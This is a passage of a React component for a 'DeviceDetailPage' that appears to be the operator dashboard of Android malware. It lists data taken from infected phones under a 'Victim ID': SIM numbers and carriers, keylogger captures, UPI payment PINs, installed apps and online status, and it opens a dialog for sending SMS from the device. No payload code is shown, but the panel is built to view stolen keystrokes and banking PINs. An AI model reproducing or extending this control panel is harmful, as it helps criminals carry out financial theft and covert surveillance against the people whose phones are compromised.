                              {entry.Time && (
                                <span className="text-xs text-muted-foreground">
                                  {entry.Time}
                                </span>
                              )}
                            </div>
                          </div>
                          <div className="text-sm text-muted-foreground">
                            <p>
                              <strong>Victim ID:</strong> {entry.VictimID}
                            </p>
                            {entry.Time && (
                              <p>
                                <strong>Time:</strong> {entry.Time}
                              </p>
                            )}
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="sims">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Phone className="w-5 h-5" />
                    SIM Cards ({(() => {
                      let detectedCount = 0;
                      if (device.SimNumber1 && device.SimNumber1 !== "Unknown") detectedCount++;
                      if (device.SimNumber2 && device.SimNumber2 !== "Unknown") detectedCount++;
                      return detectedCount;
                    })()})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-6">
                    {/* Device SIM Numbers */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">
                        Device SIM Numbers
                      </h3>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">
                              SIM 1:
                            </span>
                            <span className="font-mono">
                              {device.SimNumber1 || "Unknown"}
                            </span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">
                              SIM 2:
                            </span>
                            <span className="font-mono">
                              {device.SimNumber2 || "Unknown"}
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Device Service Names */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">
                        Device Service Names
                      </h3>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">
                              Service 1:
                            </span>
                            <span>{device.ServiceName1 || "Unknown"}</span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between items-center">
                            <span className="text-muted-foreground font-medium">
                              Service 2:
                            </span>
                            <span>{device.ServiceName2 || "Unknown"}</span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* SIM Cards from Database */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">
                        SIM Cards from Database
                      </h3>
                      {sims.length === 0 ? (
                        <p className="text-muted-foreground text-center py-8">
                          No SIM cards found in database
                        </p>
                      ) : (
                        <div className="space-y-3">
                          {sims.map((sim, idx) => (
                            <div
                              key={idx}
                              className="flex items-center justify-between p-4 bg-muted/30 rounded-lg"
                            >
                              <div>
                                <span className="font-medium">
                                  Slot {sim.slot}
                                </span>
                                <p className="text-sm text-muted-foreground">
                                  {sim.carrier || "No carrier"}
                                </p>
                              </div>
                              <code className="text-sm font-mono">
                                {sim.number || "No number"}
                              </code>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="keylogs">
              <Card className="card-glass border-0">
                <CardHeader>
                  <div className="flex items-center justify-between">
                    <CardTitle className="flex items-center gap-2">
                      <Keyboard className="w-5 h-5" />
                      Key Logs ({expandedKeyLogs.length})
                    </CardTitle>
                    <div className="flex items-center gap-2">
                      <span className="text-sm text-muted-foreground hidden sm:inline">Order</span>
                      <Select
                        value={keyLogsOrder}
                        onValueChange={(v) => {
                          setKeyLogsOrder(v as 'asc' | 'desc');
                          setCurrentKeyLogsPage(1);
                        }}
                      >
                        <SelectTrigger className="w-28 h-8 sm:h-9">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="desc">Newest first</SelectItem>
                          <SelectItem value="asc">Oldest first</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>
                </CardHeader>
                <CardContent>
                  {paginatedExpandedKeyLogs.length === 0 ? (
                    <p className="text-muted-foreground text-center py-12">
                      No key logs found
                    </p>
                  ) : (
                    <div className="space-y-4">
                      <div className="overflow-x-auto">
                        <Table className="border keylogs-table">
                          <TableHeader>
                            <TableRow>
                              <TableHead className="border-r">Keylogger</TableHead>
                              <TableHead className="border-r">Key</TableHead>
                              <TableHead>Added Date & Time</TableHead>
                            </TableRow>
                          </TableHeader>
                          <TableBody>
                            {paginatedExpandedKeyLogs.map((rowData) => (
                              <TableRow key={rowData.rowId} className="border-b">
                                <TableCell className="font-medium border-r">{rowData.keylogger}</TableCell>
                                <TableCell className="font-mono border-r">{rowData.value}</TableCell>
                                <TableCell className="text-sm text-muted-foreground">
                                  {rowData.timestamp || 'Unknown'}
                                </TableCell>
                              </TableRow>
                            ))}
                          </TableBody>
                        </Table>
                      </div>

                      {/* KeyLogs Pagination Controls */}
                      {expandedKeyLogs.length > 0 && (
                        <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 sm:gap-0 mt-4 sm:mt-6 pt-3 sm:pt-4 border-t">
                          <div className="flex items-center gap-2 justify-center sm:justify-start">
                            <span className="text-xs sm:text-sm text-muted-foreground">
                              Rows per page
                            </span>
                            <Select
                              value={keyLogsPerPage}
                              onValueChange={(value) => {
                                setKeyLogsPerPage(value);
                                setCurrentKeyLogsPage(1);
                              }}
                            >
                              <SelectTrigger className="w-20 sm:w-24 h-8 sm:h-10">
                                <SelectValue />
                              </SelectTrigger>
                              <SelectContent>
                                <SelectItem value="5">5</SelectItem>
                                <SelectItem value="10">10</SelectItem>
                                <SelectItem value="25">25</SelectItem>
                                <SelectItem value="50">50</SelectItem>
                                <SelectItem value="100">100</SelectItem>
                                <SelectItem value="200">200</SelectItem>
                                <SelectItem value="300">300</SelectItem>
                                <SelectItem value="400">400</SelectItem>
                                <SelectItem value="500">500</SelectItem>
                                <SelectItem value="600">600</SelectItem>
                                <SelectItem value="700">700</SelectItem>
                                <SelectItem value="800">800</SelectItem>
                                <SelectItem value="900">900</SelectItem>
                                <SelectItem value="1000">1000</SelectItem>
                                <SelectItem value="2000">2000</SelectItem>
                                <SelectItem value="5000">5000</SelectItem>
                              </SelectContent>
                            </Select>
                          </div>

                          <div className="flex flex-col sm:flex-row items-center gap-2 sm:gap-4">
                            <span className="text-xs sm:text-sm text-muted-foreground text-center">
                              {keyLogsStartIndex + 1}-
                              {Math.min(keyLogsEndIndex, expandedKeyLogs.length)} of{" "}
                              {expandedKeyLogs.length}
                            </span>
                            <div className="flex items-center gap-1">
                              <Button
                                variant="outline"
                                size="sm"
                                onClick={() =>
                                  setCurrentKeyLogsPage((prev) =>
                                    Math.max(1, prev - 1),
                                  )
                                }
                                disabled={currentKeyLogsPage === 1}
                                className="w-8 h-8 p-0 text-xs"
                              >
                                &lt;
                              </Button>
                              <span className="px-2 sm:px-3 py-1 text-xs sm:text-sm">
                                {currentKeyLogsPage}
                              </span>
                              <Button
                                variant="outline"
                                size="sm"
                                onClick={() =>
                                  setCurrentKeyLogsPage((prev) =>
                                    Math.min(keyLogsTotalPages, prev + 1),
                                  )
                                }
                                disabled={currentKeyLogsPage === keyLogsTotalPages}
                                className="w-8 h-8 p-0 text-xs"
                              >
                                &gt;
                              </Button>
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="upipins">
              <Card className="card-glass border-0">
                <CardHeader>
                  <div className="flex items-center justify-between">
                    <CardTitle className="flex items-center gap-2">
                      <CreditCard className="w-5 h-5" />
                      UPI Pins ({upiPins.length})
                    </CardTitle>
                    <div className="flex items-center gap-2">
                      <span className="text-sm text-muted-foreground hidden sm:inline">Order</span>
                      <Select
                        value={upiOrder}
                        onValueChange={(v) => setUpiOrder(v as 'asc' | 'desc')}
                      >
                        <SelectTrigger className="w-28 h-8 sm:h-9">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="desc">Newest first</SelectItem>
                          <SelectItem value="asc">Oldest first</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>
                </CardHeader>
                <CardContent>
                  {upiPins.length === 0 ? (
                    <p className="text-muted-foreground text-center py-12">
                      No UPI pins found
                    </p>
                  ) : (
                    <div className="space-y-4">
                      <div className="overflow-x-auto">
                        <Table className="border upipins-table">
                          <TableHeader>
                            <TableRow>
                              <TableHead className="border-r">Upi Pin</TableHead>
                              <TableHead>Added Date Time</TableHead>
                            </TableRow>
                          </TableHeader>
                          <TableBody>
                            {[...upiPins]
                              .map((p: any, idx: number) => ({
                                pin: typeof p === 'object' && p ? p.pin : p,
                                timestamp: typeof p === 'object' && p ? p.timestamp : undefined,
                                __ts: toTimestamp((typeof p === 'object' && p ? p.timestamp : undefined) as any),
                                __idx: idx,
                              }))
                              .sort((a, b) => {
                                const diff = a.__ts - b.__ts;
                                return upiOrder === 'asc' ? diff || a.__idx - b.__idx : -(diff || a.__idx - b.__idx);
                              })
                              .map((pinData, idx) => (
                                <TableRow key={idx} className="border-b">
                                  <TableCell className="font-mono font-medium border-r">
                                    {pinData.pin}
                                  </TableCell>
                                  <TableCell className="text-sm text-muted-foreground">
                                    {pinData.timestamp || 'Unknown'}
                                  </TableCell>
                                </TableRow>
                              ))}
                          </TableBody>
                        </Table>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="applications">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <AppIcon className="w-5 h-5" />
                    Applications ({appsInstalled?.TotalApps || 0})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {!appsInstalled || appsInstalled.TotalApps === 0 ? (
                    <div className="text-center py-12">
                      <p className="text-muted-foreground mb-4">
                        No applications data found for this device
                      </p>
                      <div className="text-sm text-muted-foreground space-y-2">
                        <p>• Device may not have apps data yet</p>
                        <p>• Data will appear when device syncs</p>
                        <p>
                          • Check device status:{" "}
                          <Badge
                            variant={
                              device.Status === "Online"
                                ? "default"
                                : "secondary"
                            }
                          >
                            {device.Status}
                          </Badge>
                        </p>
                      </div>
                    </div>
                  ) : (
                    <div className="space-y-6">
                      {/* Total Apps Summary */}
                      <div className="p-4 bg-muted/30 rounded-lg">
                        <div className="flex items-center justify-between mb-6">
                          <span className="text-lg font-semibold">
                            Total Applications
                          </span>
                          <Badge
                            variant="outline"
                            className="text-lg px-4 py-2"
                          >
                            {appsInstalled.TotalApps}
                          </Badge>
                        </div>
                        {appsInstalled.LastUpdated && (
                          <p className="text-sm text-muted-foreground mt-2">
                            Last Updated: {appsInstalled.LastUpdated}
                          </p>
                        )}
                      </div>

                      {/* Apps List */}
                      {appsInstalled.AppsList &&
                        appsInstalled.AppsList.length > 0 && (
                          <div className="space-y-3">
                            <h3 className="text-lg font-semibold">
                              Installed Applications
                            </h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                              {appsInstalled.AppsList.map((app, idx) => (
                                <div
                                  key={idx}
                                  className="p-3 bg-muted/30 rounded-lg border"
                                >
                                  <div className="flex items-center gap-2">
                                    <div className="w-2 h-2 bg-primary rounded-full"></div>
                                    <span className="font-medium">{app}</span>
                                  </div>
                                </div>
                              ))}
                            </div>
                          </div>
                        )}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>
          </Tabs>
        </div>
      </div>
      <SendSMSDialog
        isOpen={smsDialogOpen}
        onClose={closeSMSDialog}
        device={device}
        deviceId={victimId}
      />
    </>
  );
}

export default DeviceDetailPage;
